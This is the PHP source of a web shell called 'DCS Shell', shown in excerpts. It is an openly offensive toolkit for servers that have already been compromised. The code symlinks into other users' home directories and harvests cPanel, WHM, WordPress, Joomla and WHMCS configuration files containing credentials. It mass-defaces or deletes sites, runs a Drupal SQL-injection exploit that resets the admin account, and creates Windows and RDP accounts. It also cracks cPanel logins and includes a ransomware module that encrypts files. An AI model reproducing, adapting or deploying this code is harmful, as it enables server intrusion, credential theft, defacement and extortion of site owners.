...
$password = "bc3b7e00182ce70deed255561476d7fe"; // md5 : painlover

function login_shell() {
?>
<html>
<head>
<title>DarkClownSecurity</title>
<link rel="icon"type="image/png" href="https://i.pinimg.com/564x/01/26/52/01265230f1ed90fa81a5483e97a0a5d2.jpg">
<style type="text/css">
body {
	background-image: url('https://www.animatedimages.org/data/media/84/animated-horror-image-0038.gif');
...
input[type=password] {
	...
	margin-left: 20px;
	text-align: center;
	box-shadow: 0 1px 1px red, 0 1px 2px red, 0 1px 3px red, 0 0 1px red, 0 0 3px red, 0 1px 1px red, 0 1px 2px red, 0 1px 3px red, 0 0 1px red, 0 0 3px red;
	border-radius: 4px;
}
</style>
<head>
<body> 
<center>
<br><img src="https://i.pinimg.com/564x/01/26/52/01265230f1ed90fa81a5483e97a0a5d2.jpg" width="350px" height="350px">
	<h3><span style="color:cyan;font-family:Iceland;text-shadow:white 0px 0px 10px">Wellcome to DCS Shell<td> <pre><span style="color:orange;font-family:Iceland;text-shadow:white 0px 0px 10px">>===Please Login First to Acces The Shell===<</span></pre></h3>
	...
	<html dir="auto" lang="en-US">
		...
		<head>
			...
			<meta name="robots" content="NOINDEX, NOFOLLOW">
				...
				<title>DCS SHELL</title>
			<link rel="icon" href="https://i.pinimg.com/564x/01/26/52/01265230f1ed90fa81a5483e97a0a5d2.jpg">
			<iframe widllth="0%" height="0" scrolling="no" frameborder="no" loop="true" allow="autoplay" src="https://d.top4top.io/m_1551hse2h1.mp3"></iframe>
...
<style type="text/css"></style>
      ...
      body{
		background-image: url('https://images.wallpapersden.com/image/download/anime-warrior-girl_59054_2300x1350.jpg');
	...
	font-size: 13px;
				...
				<div class="container">
					<br><br>
					<div class="y x">
					<a href="?" class="ajx"><span style="color:cyan;font-family:HACKED;text-shadow:purple 0px 0px 10px">DCS SHELL</font></a>
					</div>
        <nav class="navbar navbar-expand-lg navbar-light bg-light ">
            ...
            <a class="navbar-brand" href="#">
                <img src="https://i.pinimg.com/564x/01/26/52/01265230f1ed90fa81a5483e97a0a5d2.jpg" width="30" height="30" class="d-inline-block align-top auto" alt="DCS"> 
            </a>
            ...
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav">
                    <li class="nav-item active">
                      <a class="nav-link ajx" href="?"><span style="color:orange;font-family:Gugi;text-shadow:magenta 0px 0px 10px">Home</font></a>
                    </li>
                     <li class="nav-item active">
                      <a class="nav-link ajx" href="?d=<?= hex($d)?>&<?= hex('info') ?>"><span style="color:orange;font-family:Gugi;text-shadow:magenta 0px 0px 10px">Info</a>
                    </li>
                    <li class="nav-item active">
                      <a class="nav-link ajx" href="?d=<?= hex($d)?>&<?= hex('mass') ?>"><span style="color:orange;font-family:Gugi;text-shadow:magenta 0px 0px 10px">Mass Tools</a>
                    </li>
                    <li class="nav-item active">
                      <a class="nav-link ajx" href="?d=<?= hex($d)?>&<?= hex('symlink') ?>"><span style="color:orange;font-family:Gugi;text-shadow:magenta 0px 0px 10px">Symlink</a>
                    </li>
                    <li class="nav-item active">
                      <a class="nav-link ajx" href="?d=<?= hex($d)?>&<?= hex('config') ?>"><span style="color:orange;font-family:Gugi;text-shadow:magenta 0px 0px 10px">Config</a>
                    </li>
                    <li class="nav-item active">
                      <a class="nav-link ajx" href="?d=<?= hex($d)?>&<?= hex('network') ?>"><span style="color:orange;font-family:Gugi;text-shadow:magenta 0px 0px 10px">Network</a>
                    </li>
                    <li class="nav-item active">
                      <a class="nav-link ajx" href="?d=<?= hex($d)?>&<?= hex('cgi') ?>"><span style="color:orange;font-family:Gugi;text-shadow:magenta 0px 0px 10px">CGI</a>
                    </li>
                     <li class="nav-item active">
                      <a class="nav-link ajx" href="?d=<?= hex($d)?>&<?= hex('bypass') ?>"><span style="color:orange;font-family:Gugi;text-shadow:magenta 0px 0px 10px">Bypass</a>
                    </li>
                    <li class="nav-item active">
                      <a class="nav-link ajx" href="?d=<?= hex($d)?>&<?= hex('exploiter') ?>"><span style="color:orange;font-family:Gugi;text-shadow:magenta 0px 0px 10px">Exploiter</a>
                    </li>
                    <li class="nav-item active">
                      <a class="nav-link ajx" href="?d=<?= hex($d)?>&<?= hex('auto_tools') ?>"><span style="color:orange;font-family:Gugi;text-shadow:magenta 0px 0px 10px">Auto Tools</a>
                    </li>
                    <li class="nav-item active">
                      <a class="nav-link ajx" href="?d=<?= hex($d)?>&<?= hex('scanner') ?>"><span style="color:orange;font-family:Gugi;text-shadow:magenta 0px 0px 10px">Scanner</a>
                    </li>
                    <li class="nav-item active">
                      <a class="nav-link ajx" href="?d=<?= hex($d)?>&<?= hex('about') ?>"><span style="color:orange;font-family:Gugi;text-shadow:magenta 0px 0px 10px">About Us</a>
                    </li>
                     <li class="nav-item active">
                      <a class="nav-link ajx" href="?d=<?= hex($d)?>&<?= hex('killself') ?>"><span style="color:orange;font-family:Gugi;text-shadow:magenta 0px 0px 10px">KillSelf</a>
                    </li>
                     <li class="nav-item active">
                      <a class="nav-link ajx" href="?d=<?= hex($d)?>&<?= hex('logout') ?>"><font color="red"><span style="color:orange;font-family:Gugi;text-shadow:magenta 0px 0px 10px">Logout</font></a>
                    </li>
                </ul>
            </div>
             <a class="navbar-brand" href="#">
                <img src="https://i.pinimg.com/564x/01/26/52/01265230f1ed90fa81a5483e97a0a5d2.jpg" width="30" height="30" class="d-inline-block align-top auto" alt="Ainz Moe"> 
            </a>
	...
	MySQL : '.$mysql.' | MSSQL : '.$mssql.' | PostgreSQL : '.$pgsql.' | Perl : '.$perl.' | Python : '.$python.' | Ruby : '.$ruby.' |  WGET : '.$wget.' | cURL : '.$curl.' | Magic Quotes : '.$magicquotes.' | SSH2 : '.$ssh2.' | Oracle : '.$oracle.' 
					...
					elseif (isset($_GET[hex('mass')])) {
						echo "<hr>
						<h2><center>Mass Tools DCS SHELL</center></h2>
						<br>
						<form method = 'POST'>
			...
			echo "<br><br><center><h2>Symlink DCS SHELL</h2></center><br><br><center><div class=content>";
...
<td>".$user['name']."</td>
<td><a href='$full/dcs_sym/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>";
flush();
$dcount++;}}}
echo "</table>";
}else{
...
Satisfy Any';
 ...
 echo "<td align=center><font class=txt><a href=$full/dcs_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}fclose($file);
 echo "</table>";}else{if($os != "Windows"){@mkdir("dcs_sym",0777);@chdir("dcs_sym");@exe("ln -s / root");$file3 = '
...
';
 ...
 $fw3 = fwrite($fp3,$file3);@fclose($fp3);
 echo "
 <h2><center>Symlink2 DCS SHELL</center></h2>
 <table align=center border=1><tr>
 ...
 $dcount++;}
 fclose($file);
 echo "</table></center>";unlink("test.txt");
 } else
 echo "<center><font size=3>Cannot create Symlink</font></center>";
	...
	if($_POST){
		$passwd = $_POST['passwd'];
		mkdir("dcs_config", 0777);
		$isi_htc = "Options all\nRequire None\nSatisfy Any";
		$htc = fopen("dcs_config/.htaccess","w");
		fwrite($htc, $isi_htc);
		preg_match_all('/(.*?):x:/', $passwd, $user_config);
		foreach($user_config[1] as $user_dcs) {
			$user_config_dir = "/home/$user_dcs/public_html/";
			if(is_readable($user_config_dir)) {
				$grab_config = array(
					"/home/$user_dcs/.my.cnf" => "cpanel",
					"/home/$user_dcs/.accesshash" => "WHM-accesshash",
					"/home/$user_dcs/public_html/bw-configs/config.ini" => "BosWeb",
					"/home/$user_dcs/public_html/config/koneksi.php" => "Lokomedia",
					"/home/$user_dcs/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home/$user_dcs/public_html/clientarea/configuration.php" => "WHMCS",
					"/home/$user_dcs/public_html/whm/configuration.php" => "WHMCS",
					"/home/$user_dcs/public_html/whmcs/configuration.php" => "WHMCS",
					"/home/$user_dcs/public_html/forum/config.php" => "phpBB",
					"/home/$user_dcs/public_html/sites/default/settings.php" => "Drupal",
					"/home/$user_dcs/public_html/config/settings.inc.php" => "PrestaShop",
					"/home/$user_dcs/public_html/app/etc/local.xml" => "Magento",
					"/home/$user_dcs/public_html/joomla/configuration.php" => "Joomla",
					"/home/$user_dcs/public_html/configuration.php" => "Joomla",
					"/home/$user_dcs/public_html/wp/wp-config.php" => "WordPress",
					"/home/$user_dcs/public_html/wordpress/wp-config.php" => "WordPress",
					"/home/$user_dcs/public_html/wp-config.php" => "WordPress",
					"/home/$user_dcs/public_html/admin/config.php" => "OpenCart",
					"/home/$user_dcs/public_html/slconfig.php" => "Sitelok",
					"/home/$user_dcs/public_html/application/config/database.php" => "Ellislab",
					"/home1/$user_dcs/.my.cnf" => "cpanel",
					"/home1/$user_dcs/.accesshash" => "WHM-accesshash",
					"/home1/$user_dcs/public_html/bw-configs/config.ini" => "BosWeb",
					"/home1/$user_dcs/public_html/config/koneksi.php" => "Lokomedia",
					"/home1/$user_dcs/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home1/$user_dcs/public_html/clientarea/configuration.php" => "WHMCS",
					"/home1/$user_dcs/public_html/whm/configuration.php" => "WHMCS",
					"/home1/$user_dcs/public_html/whmcs/configuration.php" => "WHMCS",
					"/home1/$user_dcs/public_html/forum/config.php" => "phpBB",
					"/home1/$user_dcs/public_html/sites/default/settings.php" => "Drupal",						"/home1/$user_dcs/public_html/config/settings.inc.php" => "PrestaShop",
					"/home1/$user_dcs/public_html/app/etc/local.xml" => "Magento",
					"/home1/$user_dcs/public_html/joomla/configuration.php" => "Joomla",
					"/home1/$user_dcs/public_html/configuration.php" => "Joomla",
					"/home1/$user_dcs/public_html/wp/wp-config.php" => "WordPress",
					"/home1/$user_dcs/public_html/wordpress/wp-config.php" => "WordPress",
					"/home1/$user_dcs/public_html/wp-config.php" => "WordPress",
					"/home1/$user_dcs/public_html/admin/config.php" => "OpenCart",
					"/home1/$user_dcs/public_html/slconfig.php" => "Sitelok",
					"/home1/$user_dcs/public_html/application/config/database.php" => "Ellislab",
					"/home2/$user_dcs/.my.cnf" => "cpanel",
					"/home2/$user_dcs/.accesshash" => "WHM-accesshash",
					"/home2/$user_dcs/public_html/bw-configs/config.ini" => "BosWeb",
					"/home2/$user_dcs/public_html/config/koneksi.php" => "Lokomedia",
					"/home2/$user_dcs/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home2/$user_dcs/public_html/clientarea/configuration.php" => "WHMCS",
					"/home2/$user_dcs/public_html/whm/configuration.php" => "WHMCS",
					"/home2/$user_dcs/public_html/whmcs/configuration.php" => "WHMCS",
					"/home2/$user_dcs/public_html/forum/config.php" => "phpBB",
					"/home2/$user_dcs/public_html/sites/default/settings.php" => "Drupal",
					"/home2/$user_dcs/public_html/config/settings.inc.php" => "PrestaShop",
					"/home2/$user_dcs/public_html/app/etc/local.xml" => "Magento",
					"/home2/$user_dcs/public_html/joomla/configuration.php" => "Joomla",
					"/home2/$user_dcs/public_html/configuration.php" => "Joomla",
					"/home2/$user_dcs/public_html/wp/wp-config.php" => "WordPress",
					"/home2/$user_dcs/public_html/wordpress/wp-config.php" => "WordPress",
					"/home2/$user_dcs/public_html/wp-config.php" => "WordPress",
					"/home2/$user_dcs/public_html/admin/config.php" => "OpenCart",
					"/home2/$user_dcs/public_html/slconfig.php" => "Sitelok",
					"/home2/$user_dcs/public_html/application/config/database.php" => "Ellislab",
					"/home3/$user_dcs/.my.cnf" => "cpanel",
					"/home3/$user_dcs/.accesshash" => "WHM-accesshash",
					"/home3/$user_dcs/public_html/bw-configs/config.ini" => "BosWeb",
					"/home3/$user_dcs/public_html/config/koneksi.php" => "Lokomedia",
					"/home3/$user_dcs/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
					"/home3/$user_dcs/public_html/clientarea/configuration.php" => "WHMCS",
					"/home3/$user_dcs/public_html/whm/configuration.php" => "WHMCS",
					"/home3/$user_dcs/public_html/whmcs/configuration.php" => "WHMCS",
					"/home3/$user_dcs/public_html/forum/config.php" => "phpBB",
					"/home3/$user_dcs/public_html/sites/default/settings.php" => "Drupal",
					"/home3/$user_dcs/public_html/config/settings.inc.php" => "PrestaShop",
					"/home3/$user_dcs/public_html/app/etc/local.xml" => "Magento",
					"/home3/$user_dcs/public_html/joomla/configuration.php" => "Joomla",
					"/home3/$user_dcs/public_html/configuration.php" => "Joomla",
					"/home3/$user_dcs/public_html/wp/wp-config.php" => "WordPress",
					"/home3/$user_dcs/public_html/wordpress/wp-config.php" => "WordPress",
					"/home3/$user_dcs/public_html/wp-config.php" => "WordPress",
					"/home3/$user_dcs/public_html/admin/config.php" => "OpenCart",
					"/home3/$user_dcs/public_html/slconfig.php" => "Sitelok",
					"/home3/$user_dcs/public_html/application/config/database.php" => "Ellislab"
						);	
					foreach($grab_config as $config => $nama_config) {
						$ambil_config = file_get_contents($config);
						if($ambil_config == '') {
						} else {
							$file_config = fopen("dcs_config/$user_dcs-$nama_config.txt","w");
							fputs($file_config,$ambil_config);
						}
					}
				}		
			}
			echo "<center><a class = 'ajx' href='?dir=$dir/dcs_config'><font color=lime>Done</font></a></center>";
			}else{
		$baru = hex($dir);
		$baru2 = hex('bypass-passwd');
		echo "<hr><br><center>";
		echo "<h2>Config Grabber DCS SHELL</h2>";		
...
</select><br><input type="submit" name="expcompile" class="form-control" value="Go" style="width:80px;"></td></tr>
</form>
</table>
</td>
</tr>
...
<?php 										
	...
	elseif($_POST['mass'] == 'massdeface') {
		...
		echo "
		<hr><br>
		<center><h2>Mass Deface / Delete Files DCS SHELL</h2><font style='text-decoration: underline;'>
		Select Type:<br>
		</font>
		...
		<input class= 'form-control' type='text' name='d_file' value='dcs.php' style='width: 450px;' height='10'><br>
		<font style='text-decoration: underline;'>Index File:</font><br>
		<textarea class= 'form-control' name='script' style='width: 450px; height: 200px;'>Hacked By DCS</textarea><br>
...
elseif (isset($_GET[hex('mass_user')])) {
	 	if($_POST['hajar']) {
				...
				print "<center>
				<h2>Mass User Changer DCS SHELL</h2>
				<form method='post'>
				...
				Set User & Pass: <br>
				<input type='text' style='width:250px;' height = '10' class='form-control' name='user_baru' value='DCS' placeholder='user_baru'><br>
				<input type='text' style='width:250px;' height = '10' class='form-control' name='pass_baru' value='DCS' placeholder='pass_baru'><br>
	 ...
	 elseif (isset($_GET[hex('mass_title')])) {
	 	echo "<hr><br><center><h2>Mass Title Changer DCS SHELL</h2>
<form method='post'>
Link Config: <br>
...
echo"</textarea><br>ID: <input class = 'form-control'  type='text' name='id' value='1'><br>TITLE :<input type='text' name='title' value='Hacked By Mr.Painlover'><br>POST CONTENT: <input type='text' name='content' value='Hacked By Mr.Painlover'><br>POSTNAME: <input type='text' name='postname' value='HackeD By Mr.Painlover'><br>
...
if($_POST['edittitle']) {
	 ...
	 elseif (isset($_GET[hex('bypass')])) {
							echo "<hr><br>";
							echo "<center><h2>Bypasser DCS SHELL</h2></center><br>";
	 ...
	 elseif (isset($_GET[hex('bypass-cf')])) {
				...
				<h2>Bypass CloudFlare DCS SHELL</h2>
				<div class = "row clearfix">
				<div class= "col-md-4">
...
<center/><br/><hr><h2>Bypass Server DCS SHELL</h2><br>
<?php
print'
...
echo "</h4></pre>";
 ...
 <?php
	...
	echo "<center><input type='submit' value='Bypass it' name='Colii' class = 'form-control' style='width:250px;'></center>";
		if (isset($_POST['Colii'])){ system('ln -s / DCS.txt');
			...
			$file = fopen(".htaccess","w+"); $write = fwrite ($file ,base64_decode($fvckem)); $Bok3p = symlink("/","DCS.txt");
			$rt="<br><a href=DCS.txt TARGET='_blank'><font color=#ff0000 size=2 face='Courier New'><b>
	Bypassed Successfully</b></font></a>";
	echo "<br><br><b>Done.. !</b><br><br>Check link given below for / folder symlink <br>$rt</center>";} echo "</form><hr><br>";
							}
...
echo"</textarea><br><br>";
					...
					elseif (isset($_GET[hex('exploiter')])) {
							echo "<hr><br>";
							echo "<center><h2>Exploiter DCS SHELL</h2></center><br>";
							echo "<form method = 'POST'>
						<div class = 'row clearfix'>
						<div class = 'col-md-3'>
...
echo '
<hr><br><center><h2 style="font-size:33px;">CSRF Exploiter DCS SHELL</h2><br><br>
...
POST File: <input type="text" name="pf" size="50" height="10" placeholder="Ceck diatas Slurs" style="margin: 5px auto; padding-left: 5px; width:250px;" required class = "form-control" autocomplete = "off"><br>
<input style="width:350px;" type="submit" name="d" value="Lock Target!" class = "form-control">
</form><hr><br>';
$url = $_POST["url"];
$pf = $_POST["pf"];
$d = $_POST["d"];
...
<center><hr><br>
<h2>Revslider Exploiter DCS SHELL</h2>
<form method='post'>
<textarea class='form-control' name='site' cols='50' rows='12'>
http://site.com
http://site2.com
http://site3.com</textarea><br>
<input class='form-control' type='submit' style='width: 150px;' name='sikat' value='KENYOT!'>
</form></center><hr><br>
";
...
none;"></textarea><br>
<input class = "form-control" type="submit" name="x" style="width: 150px; height: 35px; margin: 5px;" value="KENYOT!">
</form></center><hr><br>';
...
0IG5hbWU9diB0eXBlPXN1Ym1pdCBpZD12IHZhbHVlPXVwPjxicj4iOwp9Cgo/Pg==";
		...
		<input type='submit' class='form-control' style='width:250px;' name='submit' value='KENYOT!'>
		</form></center><hr><br>
		";
        $drupal = ($_GET["drupal"]);
        if ($drupal == 'drupal') {
   ...
   <input type='submit' value='drupal !' />
        ...
        if (isset($_POST['submit'])) {
            function exploit($url) {
                $post_data = "name[0;update users set name %3D 'DCS' , pass %3D '" . urlencode('$S$DrV4X74wt6bT3BhJa4X0.XO5bHXl/QBnFkdDkYSHj3cE1Z5clGwu') . "',status %3D'1' where uid %3D '1';#]=FcUk&name[]=Crap&pass=test&form_build_id=&form_id=user_login&op=Log+in";
...
", 'content' => $post_data));
                ...
                if ((stristr($data, 'mb_strlen() expects parameter 1 to be string') && $data) || (stristr($data, 'FcUk Crap') && $data)) {
                    ...
                    fwrite($fp, "Exploitied  User: DCS Pass: DCS  =====> {$url}/user/login");
                    fwrite($fp, "
");
                    fwrite($fp, "--------------------------------------------------------------------------------------------------");
                    fwrite($fp, "
");
                    fclose($fp);
                    echo "<font color='lime'><b>Success:<font color='white'>DCS</font> Pass:<font color='white'>DCS</font> =><a href='{$url}/user/login' target=_blank ><font color='green'> {$url}/user/login </font></a></font></b><br>";
                } else {
...
echo '<hr><center><h2>Auto Tools DCS SHELL </h2><br>
...
<tr>
    ...
    <td><center><a class = "form-control ajx" href = ?d='.hex($d).'&'.hex("DCS-ransom").'><center>DCS R4N50M3W4R3</center></a></td>
	</tr>
</table>
<br><hr>';
								}
...
</form></center><hr><br><span style="color:red">
  <?php
...
<?php										
			...
			elseif (isset($_GET[hex('defacer-id')])) {
				...
				echo "<hr><br><center>
		<h2>Defacer ID Submit DCS SHELL</h2>
		<form method='post'>
		<u>Defacer</u>: <br>
		<input class = 'form-control' style='width:250px; height:40px;' type='text' name='hekel' size='50' value='Mr.Painlover'><br>
		<u>Team</u>: <br>
		<input class = 'form-control' style='width:250px; height:40px;' type='text' name='tim' size='50' value='Dark Clown Security'><br>
		<u>Domains</u>: <br>
	...
	echo "<br>";
				...
				echo "<hr><br><center><h2>Jumping DCS SHELL</h2>";
	...
	while($passwd = fgets($etc)) {
		if($passwd == '' || !$etc) {
			...
			foreach($user_jumping[1] as $user_dcs_jump) {
				$user_jumping_dir = "/home/$user_dcs_jump/public_html";
					...
					if(function_exists('posix_getpwuid')) {
						...
						if($domain_jump == '') {
							...
							foreach($domains_jump[1] as $dj) {
								...
								if($user_jumping_url == $user_dcs_jump) {
									echo " => ( <u>$dj</u> )<br>";
									break;
								}
							}
	...
	if($_POST['reverse']) {
		...
		echo "<hr><br><center><h2>Fake Root DCS SHELL</h2><form method='post'>
		...
		NB: Sebelum gunain Tools ini , upload dulu file deface kalian di dir /home/user/ dan /home/user/public_html.</center><hr><br>";
					...
					echo "<hr><br>";
					echo "<center><h2>Adminer DCS SHELL</h2>";
        ...
        if($_POST['create']) {
            ...
            if($_POST['opsi'] == '1') {
                ...
                $cek = exe("net user $user DCS");
                if(preg_match("/$user/", exe("net user"))) {
                    echo "[change password: <font color=lime>DCS</font>] -> ";
                    if($cek) {
        	...
        	echo "<hr><br><center>";
        	echo "<h2>RDP DCS SHELL</h2>";
            echo "-- Create RDP --<br>
            <form method='post'>
            <div class = 'row clearfix'>
            <div class = 'col-md-4'>
            <u>Username:</u>
            <input class ='form-control' style = 'width:250px;height:40px;' type='text' name='user' placeholder='username' value='DCS' required>
            </div>
            <div class = 'col-md-4'>
             <u>Password:</u>
            <input class ='form-control' style = 'width:250px;height:40px;' type='text' name='pass' placeholder='password' value='DCS' required>
            </div>
            <div class = 'col-md-4'>
            <u>Button:</u>
...
<h2>Wordpress Hijack Index DCS SHELL</h2><br>
<center>
...
<center><textarea class="form-control" name="pown" cols="85" rows="10"><meta http-equiv="refresh" content="0;URL=https://pastebin.com/raw/SSayqSzQ"></textarea><br>
...
<input class='form-control' type='text' name='save' value='$dir/DCS_backup.zip' style='width: 450px;' height='10'><br><br>
<input class='form-control' type='submit' name='backup' class='kotak' value='Back Up!' style='width: 215px;'></form><br><br>";
    ...
    <font style='text-decoration: underline;'>Save To:</font><br>
    <input class='form-control' type='text' name='save' value='$dir/DCS_unzip' style='width: 450px;' height='10'><br><br>
    ...
    ";
        ...
        echo '</table><hr>';
			...
			elseif (isset($_GET[hex('DCS-ransom')])) {
				?>
				<!DOCTYPE html>
<html>
<head>
   <title>DCS R4N50M3W4R3</title>
<style type="text/css">
body {
    background: #1A1C1F;
    color: #e2e2e2;
...
class deRanSomeware
{
   public function shcpackInstall(){
    if(!file_exists(".htaencrypted")){
      ...
      if(file_put_contents("virus.php", base64_decode(""))){
   ...
   public function shcdirs($dir,$method,$key){
        ...
        foreach(scandir($dir) as $d)
        {
            if($d!='.' && $d!='..')
            {
                ...
                if(!is_dir($locate)){
                   if(  deRanSomeware::kecuali($locate,"ransomware.php")  && deRanSomeware::kecuali($locate,".png")  && deRanSomeware::kecuali($locate,".htaccess")  && deRanSomeware::kecuali($locate,"virus.php") &&  deRanSomeware::kecuali($locate,"index.php") && deRanSomeware::kecuali($locate,".htaencrypted") ){
                     switch ($method) {
                        case '1':
...
<?php
			...
			elseif (isset($_GET[hex('reverse-ip')])) {
					...
					?>
<br><hr>
<center><h2>Reverse IP DCS SHELL</h2>
	<a style="width: 250px;" class="form-control" onClick="window.open('http://www.viewdns.info/reverseip/?host=<?php echo $_SERVER ['SERVER_ADDR']; ?>','POPUP','width=900 0,height=500,scrollbars=10');return false;" href="http://www.viewdns.info/reverseip/?host=<?php echo $_SERVER ['SERVER_ADDR']; ?>">[ Reverse IP Lookup ] </a></center>
<br><hr>
<?php					
   ...
   echo '
    <br /><hr>
	<div class="mybox">
	<h2>Whois DCS SHELL</h2>
	<form method="post"><table class="tabnet">
	<tr><th colspan="5">Website Whois</th></tr>
    <tr><td>Site to scan </td><td>:</td><td>
    <input type="text" name="site" size="50" style="color:black;background-color:#FFF" class="inputz" value="site.com" /> &nbsp <input class="inputzbut" type="submit" style="color:black;background-color:#FFF" name="scan" value="Scan !" /></td></tr>
   ...
   echo '</center>';
					...
					echo "<hr><br>";										
					echo '<center><h2>Mass Code Injector DCS SHELL</h2></center>';
...
<h2>Database Dumper DCS SHELL</h2>
<tr>
	<td>Server </td>
...
fclose($fp); 
		...
		if($i == 0) {
			...
			echo "<br>sukses nyolong ".$i." Cpanel by <font color=lime>DCS Shell.</font>";
		}
	} else {
		echo "<center><hr><br>
		<form method='post'>
		<h2>Cpanel Crack DCS SHELL</h2>
		USER: <br>
...
echo "
<hr><br>
<br><center><h2>Whmcs Decoder DCS SHELL</h2></center>
...
echo("<tr><td>$registrar</td><td>$setting</td><td>$value</td></tr>");
	...
	echo"</td></tr></table>";								
				...
				elseif (isset($_GET[hex('scanner')])) {
					echo "<hr><br>";
							echo "<center><h2>Scanner DCS SHELL</h2></center><br>";
							echo "<form method = 'POST'>
						<div class = 'row clearfix'>
						<div class = 'col-md-4'>
...
';
        ...
        echo "<center>";
        echo '<hr><br>
<h2>CMS Vulnerability Scanner DCS SHELL</h2>
<form method="POST" action=""  class="header-izz">
    ...
    <input class = "form-control" type="submit" style="width: 150px; height: 40px; border-color=white;margin:10px 2px 0 2px;" value="Scan" class="kotak"></p>
        ...
        if ($_POST) {
			...
			echo "<hr><br><center>";
		    echo '<table><h2>Ports Scanner DCS SHELL</h2><td>';
		    ...
		    echo '</div></table></td><hr><br>';
				...
				elseif (isset($_GET[hex('logs-scanner')])) {
					...
					echo '<hr><br>';
echo "<Center>\n"; 
echo "<h2>Log Hunter DCS SHELL</h2>";
echo "<form action=\"\" method=\"post\">\n"; 
...
echo "</div>";
				...
				echo "<hr><br><center><h2>About Me</h2>";
				echo "Thanks For Using This Shell <br><br>";
				echo "visit my blog : <a href = 'https://www.darkclownsecurity.com/' target = 'blank' class= 'form-control' style = 'width:250px;'>MY BLOGGER!</a> <br>";
					...
					echo '<table class = "table table-bordered mt-3" >
						...
						';
							...
							if(($c != ".") && ($c != "..")){
								...
								$h .= '<tr class="r">
							<td>
								<img src = "http://aux.iconspalace.com/uploads/folder-icon-256-1787672482.png" width = "20px" height = "20px">
			...
			<footer class="x">
			<center><font color="white">Copyright&copy; 2020 BY Dark Clown Security   </center>
			</footer>
			<?php
			if(isset($_GET["1"])) {
				echo $f;
